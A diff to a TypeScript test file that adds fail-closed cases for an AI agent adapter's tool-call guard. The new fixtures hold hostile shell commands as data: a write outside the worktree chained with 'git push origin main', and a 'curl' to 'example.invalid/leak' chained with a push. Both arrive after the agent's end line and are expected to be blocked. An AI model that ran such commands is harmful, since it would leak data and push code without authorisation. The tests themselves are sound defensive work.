@@ -11,7 +11,8 @@
  * sources load; what this case proves is that no flag widens that (no `--trust`, no `--permission-mode`).
  *
  * Tool-call guard (T4.26, ADR-0039): in an approved bypass run Switchboard's own tool-call guard enforces Git-write
- * denial across the hostile streams, ending `PERMISSION_BLOCKED` at exit 0 and at exit 1 (owner decision 25).
+ * denial across the hostile streams, ending `PERMISSION_BLOCKED` at exit 0 and at exit 1 (owner decision 25), including
+ * a hostile tool call after the `end` line (T4.23).
  */
 
 import { privilegedProfile } from "../../../src/adapters/fixtures/privileged.js";
@@ -199,6 +200,33 @@ const grokCase: AdapterLegCase = {
       ],
     },
     {
+      // T4.23 (fail closed): a tool call after the `end` line is not success, and a guard verdict on it keeps its own
+      // code. The top-level `command` field is the parser's other synthetic shape (src/adapters/grok/adapter.ts).
+      name: "shell write outside the worktree after the end line",
+      category: "out_of_worktree_write",
+      exitCode: 0,
+      failureCode: "PERMISSION_BLOCKED",
+      lines: [
+        META("shell write outside the worktree after the end line", 0),
+        TOOLS,
+        text("Done."),
+        end(),
+        JSON.stringify({ type: "tool_call", command: `touch ${fx.outsideSentinel} && git push origin main` }),
+      ],
+    },
+    {
+      name: "shell network call after the end line, exit 1",
+      category: "network",
+      exitCode: 1,
+      failureCode: "PERMISSION_BLOCKED",
+      lines: [
+        META("shell network call after the end line, exit 1", 1),
+        TOOLS,
+        end(),
+        toolCall(`curl https://example.invalid/leak && git push origin main`),
+      ],
+    },
+    {
       name: "only unknown event kinds, clean exit",
       category: "unknown_events",
       exitCode: 0,
@@ -207,6 +235,17 @@ const grokCase: AdapterLegCase = {
         META("Event types below are invented; the adapter must report them unknown.", 0),
         JSON.stringify({ type: "synthetic_unknown_kind", sessionId: SID }),
         JSON.stringify({ type: "synthetic_another_unknown", sessionId: SID }),
+      ],
+    },
+    {
+      // Exit 1 is not an expected exit code (T4.22), so the run ends TOOL_FAILURE; never success.
+      name: "only unknown event kinds, exit 1",
+      category: "unknown_events",
+      exitCode: 1,
+      failureCode: "TOOL_FAILURE",
+      lines: [
+        META("Event types below are invented; the adapter must report them unknown.", 1),
+        JSON.stringify({ type: "synthetic_unknown_kind", sessionId: SID }),
       ],
     },
   ],
